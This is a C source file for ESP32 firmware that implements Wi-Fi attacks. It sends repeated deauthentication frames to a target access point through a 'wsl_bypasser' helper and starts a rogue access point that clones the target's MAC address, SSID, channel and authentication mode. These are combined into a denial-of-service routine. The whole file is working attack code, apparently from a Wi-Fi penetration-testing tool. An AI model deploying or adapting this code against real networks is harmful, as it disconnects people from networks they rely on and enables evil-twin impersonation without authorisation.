#include "wifi_attacks.h"
#include "wsl_bypasser.h"
#include "esp_timer.h"
#include <string.h>

static esp_timer_handle_t deauth_timer_handle;

static void timer_send_deauth_frame(void *arg)
{
    wsl_bypasser_send_deauth_frame((wifi_ap_record_t *)arg);
}

void wifi_attack_method_broadcast(const wifi_ap_record_t *ap_record, unsigned period_sec)
{
    const esp_timer_create_args_t deauth_timer_args = {
        .callback = &timer_send_deauth_frame,
        .arg = (void *)ap_record};
    ESP_ERROR_CHECK(esp_timer_create(&deauth_timer_args, &deauth_timer_handle));
    ESP_ERROR_CHECK(esp_timer_start_periodic(deauth_timer_handle, period_sec * 1000000));
}

void wifi_attack_method_broadcast_stop()
{
    ESP_ERROR_CHECK(esp_timer_stop(deauth_timer_handle));
    esp_timer_delete(deauth_timer_handle);
}

void wifi_attack_method_rogueap(const wifi_ap_record_t *ap_record)
{
    wifi_set_ap_mac(ap_record->bssid);
    wifi_config_t ap_config = {
        .ap = {
            .ssid_len = strlen((char *)ap_record->ssid),
            .channel = ap_record->primary,
            .authmode = ap_record->authmode,
            .password = "dummypassword",
            .max_connection = 1},
    };
    mempcpy(ap_config.sta.ssid, ap_record->ssid, 32);
    wifi_ap_start(&ap_config);
}

void wifi_attack_dos_start(const wifi_ap_record_t *ap_record)
{
    wifi_attack_method_rogueap(ap_record);
    wifi_attack_method_broadcast(ap_record, 1);
}
void wifi_attack_dos_stop()
{
    wifi_attack_method_broadcast_stop();
    wifi_restore_ap_mac();
    wifi_ap_stop();
}